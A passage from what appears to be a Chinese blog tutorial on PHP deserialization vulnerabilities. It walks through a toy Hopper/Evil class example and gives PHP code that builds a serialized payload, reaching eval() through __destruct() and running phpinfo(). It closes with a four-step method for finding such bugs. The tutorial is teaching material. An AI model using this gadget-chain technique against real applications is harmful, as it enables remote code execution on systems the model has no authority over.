函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数 __destruct() ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，好，既然这样我们就决定反序列化这个类的对象了，接下来让我们看一下怎么利用(我上面说过了，我们需要控制这个类的某些属性，通过控制属性实现我们的攻击)</p><p>那我们看一下哪些属性的控制是对我们有用的(这个时候我们就跳过了<strong>construct() 方法，毕竟他永远不会被调用)，因为这个例子比较简单，</strong>destruct() 里面只用到了一个属性 test ，那肯定就是他了，那我们控制这个属性为什么内容我们就能攻击了呢，我们再观察一下 那些地方调用了 action() 函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然我们在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，我们需要将 Hopper 这个类中的 test 属性篡改为 Evil 这个类的对象，然后为了 eval 能执行命令，我们还要篡改 Evil 对象的 test2 属性，将其改成我们的 Payload</p><p>分析完毕以后我们就可以构建我们的序列化字符串了，构建的方法不是手写(我们要将这段代码复制一下，然后修改一些内容并进行序列化操作)</p><h4 id="生成-payload-代码："><a href="#生成-payload-代码：" class="headerlink" title="生成 payload 代码："></a><strong>生成 payload 代码：</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hopper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title class_">Evil</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Hopper</span> = <span class="keyword">new</span> <span class="title class_">Hopper</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Hopper</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;seria.txt&quot;</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>我们去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，想刚刚的代码发起请求</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/08/z4uPC.png" data-caption="z4uPC.png"><img src="https://i.imgtg.com/2022/05/08/z4uPC.png" alt="z4uPC.png"></a></p><p>把这段payload 传送过去：</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/08/zDaax.png" data-caption="zDaax.png"><img src="https://i.imgtg.com/2022/05/08/zDaax.png" alt="zDaax.png"></a></p><p>可以看到我们攻击成功，特别要提醒一下的就是我在图中框起来的部分，上面说过由于是私有属性，他有自己特殊的格式会在前后加两个 %00 ，所以我们在传输过程中不能忘掉</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2023/04/11/8BvZI.png" data-caption=""><img src="https://i.imgtg.com/2023/04/11/8BvZI.png"></a></p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2023/04/11/8BycD.png" data-caption=""><img src="https://i.imgtg.com/2023/04/11/8BycD.png"></a></p><p>通过上面案列，可知如果存在一些可执行命令的函数时，充分利用魔法函数去构造是可以去RCE的</p><p><strong>通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者说流程</strong></p><ol><li>寻找 unserialize() 函数的参数是否有我们的可控点</li><li>寻找我们的反序列化的目标，重点寻找 存在 <strong>wakeup() 或</strong> destruct() 魔法函数的类</li><li>一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</li><li>找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击</li></ol><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP反序列化漏洞 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
